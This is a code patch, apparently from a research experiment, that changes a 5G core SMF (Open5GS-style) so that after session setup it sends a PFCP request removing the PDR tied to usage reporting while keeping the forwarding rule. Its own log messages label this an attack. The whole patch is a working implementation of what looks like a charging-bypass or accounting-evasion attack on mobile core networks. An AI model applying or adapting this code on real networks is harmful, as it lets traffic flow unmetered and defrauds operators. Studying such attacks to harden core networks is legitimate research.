@@ -1,0 +1,147 @@
+--- a/src/smf/gsm-sm.c
++++ b/src/smf/gsm-sm.c
+@@ -852,6 +852,8 @@
+                     OGS_FSM_TRAN(s, smf_gsm_state_5gc_n1_n2_reject);
+                     return;
+                 }
++                ogs_assert(OGS_OK ==
++                        smf_t2_a50_send_remove_charged_pdr(sess));
+                 if (HOME_ROUTED_ROAMING_IN_VSMF(sess)) {
+                     r = smf_sbi_discover_and_send(
+                             OGS_SBI_SERVICE_TYPE_NSMF_PDUSESSION, NULL,
+--- a/src/smf/n4-build.c
++++ b/src/smf/n4-build.c
+@@ -180,6 +180,61 @@
+     return pkbuf;
+ }
+ 
++ogs_pkbuf_t *smf_n4_build_t2_a50_remove_charged_pdr(
++        uint8_t type, smf_sess_t *sess, ogs_pfcp_xact_t *xact)
++{
++    ogs_pfcp_message_t *pfcp_message = NULL;
++    ogs_pfcp_session_modification_request_t *req = NULL;
++    ogs_pfcp_pdr_t *pdr = NULL;
++    ogs_pfcp_pdr_t *charged_pdr = NULL;
++    ogs_pkbuf_t *pkbuf = NULL;
++    const char *flow_description = "permit out ip from any to assigned";
++
++    ogs_assert(sess);
++    ogs_assert(xact);
++
++    ogs_list_for_each(&sess->pfcp.pdr_list, pdr) {
++        int i;
++
++        for (i = 0; i < pdr->num_of_flow; i++) {
++            if (pdr->flow[i].description &&
++                strcmp(pdr->flow[i].description, flow_description) == 0 &&
++                pdr->num_of_urr > 0) {
++                charged_pdr = pdr;
++                break;
++            }
++        }
++        if (charged_pdr)
++            break;
++    }
++
++    if (!charged_pdr) {
++        ogs_error("selected-standard-scenario attack: charged PDR not found");
++        return NULL;
++    }
++
++    pfcp_message = ogs_calloc(1, sizeof(*pfcp_message));
++    if (!pfcp_message) {
++        ogs_error("ogs_calloc() failed");
++        return NULL;
++    }
++
++    req = &pfcp_message->pfcp_session_modification_request;
++    req->remove_pdr[0].presence = 1;
++    req->remove_pdr[0].pdr_id.presence = 1;
++    req->remove_pdr[0].pdr_id.u16 = charged_pdr->id;
++
++    pfcp_message->h.type = type;
++    pkbuf = ogs_pfcp_build_msg(pfcp_message);
++    ogs_expect(pkbuf);
++
++    ogs_warn("selected-standard-scenario attack: Remove PDR[%u] emitted; shared FAR retained",
++            charged_pdr->id);
++
++    ogs_free(pfcp_message);
++    return pkbuf;
++}
++
+ ogs_pkbuf_t *smf_n4_build_pdr_to_modify_list(
+         uint8_t type, smf_sess_t *sess, ogs_pfcp_xact_t *xact)
+ {
+--- a/src/smf/n4-build.h
++++ b/src/smf/n4-build.h
+@@ -28,6 +28,8 @@
+ 
+ ogs_pkbuf_t *smf_n4_build_session_establishment_request(
+         uint8_t type, smf_sess_t *sess, ogs_pfcp_xact_t *xact);
++ogs_pkbuf_t *smf_n4_build_t2_a50_remove_charged_pdr(
++        uint8_t type, smf_sess_t *sess, ogs_pfcp_xact_t *xact);
+ ogs_pkbuf_t *smf_n4_build_pdr_to_modify_list(
+         uint8_t type, smf_sess_t *sess, ogs_pfcp_xact_t *xact);
+ ogs_pkbuf_t *smf_n4_build_qos_flow_to_modify_list(
+--- a/src/smf/n4-handler.c
++++ b/src/smf/n4-handler.c
+@@ -407,6 +407,12 @@
+         return;
+     }
+ 
++    if ((flags & OGS_PFCP_MODIFY_REMOVE) &&
++        (flags & OGS_PFCP_MODIFY_URR)) {
++        ogs_warn("selected-standard-scenario attack: Remove PDR response accepted");
++        return;
++    }
++
+     if (flags & OGS_PFCP_MODIFY_HOME_ROUTED_ROAMING) {
+         if (flags & OGS_PFCP_MODIFY_ACTIVATE) {
+             if ((flags & OGS_PFCP_MODIFY_XN_HANDOVER) ||
+--- a/src/smf/pfcp-path.c
++++ b/src/smf/pfcp-path.c
+@@ -609,6 +609,33 @@
+     return rv;
+ }
+ 
++int smf_t2_a50_send_remove_charged_pdr(smf_sess_t *sess)
++{
++    ogs_pfcp_xact_t *xact = NULL;
++
++    ogs_assert(sess);
++
++    xact = ogs_pfcp_xact_local_create(
++            sess->pfcp_node, sess_5gc_timeout, OGS_UINT_TO_POINTER(sess->id));
++    if (!xact) {
++        ogs_error("ogs_pfcp_xact_local_create() failed");
++        return OGS_ERROR;
++    }
++
++    xact->local_seid = sess->smf_n4_seid;
++    /*
++     * OGS_PFCP_MODIFY_URR is an internal experiment discriminator here;
++     * the wire request contains only the standards-defined Remove PDR IE.
++     */
++    xact->modify_flags =
++        OGS_PFCP_MODIFY_SESSION |
++        OGS_PFCP_MODIFY_REMOVE |
++        OGS_PFCP_MODIFY_URR;
++
++    return smf_pfcp_send_modify_list(
++            sess, smf_n4_build_t2_a50_remove_charged_pdr, xact, 0);
++}
++
+ int smf_5gc_pfcp_send_all_pdr_modification_request(
+         smf_sess_t *sess, ogs_sbi_stream_t *stream,
+         uint64_t flags, int trigger, ogs_time_t duration)
+--- a/src/smf/pfcp-path.h
++++ b/src/smf/pfcp-path.h
+@@ -37,6 +37,7 @@
+ 
+ int smf_5gc_pfcp_send_session_establishment_request(
+         smf_sess_t *sess, ogs_sbi_stream_t *stream, uint64_t flags);
++int smf_t2_a50_send_remove_charged_pdr(smf_sess_t *sess);
+ int smf_5gc_pfcp_send_all_pdr_modification_request(
+         smf_sess_t *sess, ogs_sbi_stream_t *stream,
+         uint64_t flags, int trigger, ogs_time_t duration);
